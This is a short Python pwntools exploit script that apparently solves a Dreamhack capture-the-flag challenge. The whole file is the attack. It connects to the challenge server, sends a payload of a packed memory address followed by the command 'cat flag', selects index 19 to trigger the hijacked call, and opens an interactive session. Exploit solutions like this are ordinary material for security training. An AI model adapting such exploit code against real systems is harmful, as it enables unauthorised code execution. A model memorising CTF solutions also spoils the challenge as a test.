from pwn import*

p = remote("host1.dreamhack.games", 9225)
name = 0x804a0ac
payload = p32(name+4)
payload += "cat flag"
p.sendline(payload)
p.sendline("19")
p.interactive()
